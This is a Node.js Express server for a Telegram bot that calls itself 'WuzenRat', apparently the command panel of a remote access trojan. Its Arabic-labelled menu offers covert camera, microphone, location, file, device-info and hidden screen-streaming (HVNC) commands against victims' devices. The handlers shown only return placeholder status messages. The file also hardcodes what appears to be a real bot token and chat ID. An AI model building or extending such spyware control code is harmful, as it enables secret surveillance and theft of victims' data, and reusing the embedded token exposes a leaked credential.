const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN || "7822530211:AAFHlKhDrbGCbKOtzgVG7J_L6OjyI7doLNU";
const CHAT_ID = process.env.CHAT_ID || "8270107829";

app.use(express.json());

// لوحة الأزرار الرئيسية
function getMainKeyboard() {
    return {
        inline_keyboard: [
            [{ text: "📷 كاميرا", callback_data: "camera" }, { text: "🎙️ ميكروفون", callback_data: "mic" }],
            [{ text: "📍 موقع", callback_data: "location" }, { text: "📂 ملفات", callback_data: "files" }],
            [{ text: "📱 معلومات الجهاز", callback_data: "device" }, { text: "🔄 تحديث", callback_data: "refresh" }],
            [{ text: "👻 شاشة (HVNC)", callback_data: "stream" }, { text: "🔴 قطع الاتصال", callback_data: "disconnect" }]
        ]
    };
}

async function sendMenu(chatId) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const payload = {
        chat_id: chatId,
        text: "🎮 *لوحة تحكم WuzenRat*\nاختر الأمر:",
        parse_mode: "Markdown",
        reply_markup: getMainKeyboard()
    };
    await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });
}

async function handleTextCommand(chatId, text) {
    if (text === '/start' || text === '/menu') {
        await sendMenu(chatId);
        return;
    }
    const responses = {
        '/test': '✅ البوت يعمل!',
        '/camera': '📸 جارٍ التقاط صورة...',
        '/mic': '🎤 جارٍ تسجيل الصوت...',
        '/location': '📍 جارٍ جلب الموقع...',
        '/files': '📂 جارٍ سرد الملفات...',
        '/device': '📱 جارٍ جلب معلومات الجهاز...',
        '/refresh': '🔄 جارٍ التحديث...',
        '/stream': '👻 جارٍ تشغيل بث الشاشة...',
        '/disconnect': '🔴 جارٍ قطع الاتصال...'
    };
    const reply = responses[text] || '❓ أمر غير معروف. استخدم /menu';
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: reply })
    });
}

async function handleCallback(callbackId, data, chatId) {
    const actions = {
        camera: '📸 جارٍ تشغيل الكاميرا...',
        mic: '🎤 جارٍ تشغيل الميكروفون...',
        location: '📍 جارٍ جلب الموقع...',
        files: '📂 جارٍ فتح الملفات...',
        device: '📱 جارٍ جلب معلومات الجهاز...',
        refresh: '🔄 جارٍ التحديث...',
        stream: '👻 جارٍ تشغيل بث الشاشة...',
        disconnect: '🔴 جارٍ قطع الاتصال...'
    };
    const text = actions[data] || '⚠️ إجراء غير معروف';
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ callback_query_id: callbackId, text: text, show_alert: false })
    });
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: `🔄 ${text}` })
    });
}

app.post('/webhook', async (req, res) => {
    try {
        const body = req.body;
        if (body.message && body.message.text) {
            const chatId = body.message.chat.id;
            const text = body.message.text;
            console.log(`📩 أمر من ${chatId}: ${text}`);
            await handleTextCommand(chatId, text);
        }
        if (body.callback_query) {
            const cb = body.callback_query;
            console.log(`🔘 زر من ${cb.message.chat.id}: ${cb.data}`);
            await handleCallback(cb.id, cb.data, cb.message.chat.id);
        }
        res.sendStatus(200);
    } catch (error) {
        console.error('❌ خطأ:', error.message);
        res.sendStatus(500);
    }
});

app.get('/', (req, res) => {
    res.send(`<h1>✅ WuzenRat is running</h1><p>Bot: @WuzenControlBot</p><p>Chat ID: ${CHAT_ID}</p>`);
});

async function setWebhook() {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=https://wuzenrat-oo8k.onrender.com/webhook`;
    try {
        const response = await fetch(url);
        const data = await response.json();
        console.log('✅ Webhook set:', data.description || data);
    } catch (e) {
        console.log('⚠️ Webhook already set or error:', e.message);
    }
}

app.listen(PORT, '0.0.0.0', async () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`🔑 Bot Token: ${BOT_TOKEN.substring(0, 10)}...`);
    console.log(`📱 Chat ID: ${CHAT_ID}`);
    await setWebhook();
});